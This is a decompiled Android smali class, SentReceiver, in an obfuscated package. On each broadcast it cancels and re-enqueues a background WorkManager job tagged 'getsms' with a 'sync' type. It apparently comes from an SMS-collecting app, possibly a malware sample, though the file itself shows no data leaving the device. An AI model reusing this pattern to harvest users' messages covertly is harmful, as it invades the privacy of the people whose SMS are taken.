.class public Lgqegwqg/bbebebefff/asdcdsac/SentReceiver;
.super Landroid/content/BroadcastReceiver;
.source "sourcefile"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .line 18
    const-string v0, "SentReceiver"

    const-string v1, "marking message as sent"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 19
    invoke-static {p1}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    const-string v1, "getsms"

    invoke-virtual {v0, v1}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 22
    new-instance v0, Ld/a0/e$a;

    invoke-direct {v0}, Ld/a0/e$a;-><init>()V

    .line 23
    const-string v2, "event"

    invoke-virtual {v0, v2, v1}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 24
    const-string v2, "type"

    const-string v3, "sync"

    invoke-virtual {v0, v2, v3}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 25
    invoke-virtual {v0}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v0

    .line 27
    .local v0, "inputData":Ld/a0/e;
    new-instance v2, Ld/a0/n$a;

    const-class v3, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {v2, v3}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 28
    invoke-virtual {v2, v0}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 29
    invoke-virtual {v2, v1}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 30
    invoke-virtual {v2}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v1

    check-cast v1, Ld/a0/n;

    .line 33
    .local v1, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {p1}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v2

    invoke-virtual {v2, v1}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 34
    return-void
.end method
